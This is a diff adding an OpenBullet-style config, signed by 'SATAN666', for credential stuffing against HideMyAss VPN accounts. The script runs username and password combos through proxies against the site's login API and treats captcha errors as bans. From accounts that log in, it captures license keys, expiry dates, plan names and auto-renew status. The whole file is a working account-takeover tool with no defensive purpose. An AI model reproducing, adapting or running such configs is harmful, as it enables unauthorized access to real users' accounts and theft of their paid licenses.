@@ -1,0 +1,99 @@
+[SETTINGS]
+{
+  "Name": "HMA SATAN666",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-05T21:07:04.6481458+05:30",
+  "AdditionalInfo": "",
+  "Author": "SATAN666",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://id.hidemyass.com/service/single/MetaService/securityToken" 
+  CONTENT "{\"correlationId\":1,\"operationName\":\"securityToken\",\"payload\":[],\"serviceName\":\"MetaService\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+PARSE "<SOURCE>" LR "operationResult\":\"" "\",\"errorData" -> VAR "Token" 
+
+REQUEST POST "https://id.hidemyass.com/service/single/LoginService/login" 
+  CONTENT "{\"correlationId\":5,\"operationName\":\"login\",\"payload\":[{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"rememberMe\":false,\"captcha_response\":\"NOTREQUIRED\"},{\"allowAuthenticated\":true,\"extraLoginTicket\":false}],\"securityToken\":\"<Token>\",\"serviceName\":\"LoginService\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Origin: https://my.hidemyass.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
+  HEADER "Content-type: application/json" 
+  HEADER "Accept: */*" 
+  HEADER "Referer: https://my.hidemyass.com/en-eu/" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "success\":true" 
+  KEYCHAIN Failure OR 
+    KEY "success\":false" 
+  KEYCHAIN Ban OR 
+    KEY "validation.captcha.incorrect" 
+
+REQUEST POST "https://my.hidemyass.com/SecurityController/securityToken" 
+  CONTENT "{\"correlationId\":123,\"operationName\":\"securityToken\",\"serviceName\":\"SecurityController\",\"payload\":[]}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Content-Length: 101" 
+  HEADER "Origin: https://my.hidemyass.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Accept: */*" 
+  HEADER "Referer: https://my.hidemyass.com/en-ww/" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+PARSE "<SOURCE>" LR "operationResult\":\"" "\",\"success" -> VAR "Token2" 
+
+REQUEST POST "https://my.hidemyass.com/LicenseController/licenseInfoList" 
+  CONTENT "{\"correlationId\":127,\"operationName\":\"licenseInfoList\",\"serviceName\":\"LicenseController\",\"payload\":[],\"securityToken\":\"<Token2>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Content-Length: 157" 
+  HEADER "Origin: https://my.hidemyass.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Accept: */*" 
+  HEADER "Referer: https://my.hidemyass.com/en-ww/" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+PARSE "<SOURCE>" LR "walletKeys\":[\"" "\"],\"" -> CAP "License Keys" 
+
+PARSE "<SOURCE>" JSON "validTo" -> VAR "valid" 
+
+FUNCTION UnixTimeToDate "<valid>" -> CAP "Valid Till" 
+
+PARSE "<SOURCE>" JSON "schemaName" -> CAP "Plan Name" 
+
+PARSE "<SOURCE>" JSON "autoRenewal" -> CAP "Auto Renew" 
+
+FUNCTION Constant "      ~~ SATAN666 ~~" -> CAP "Made By" 
+
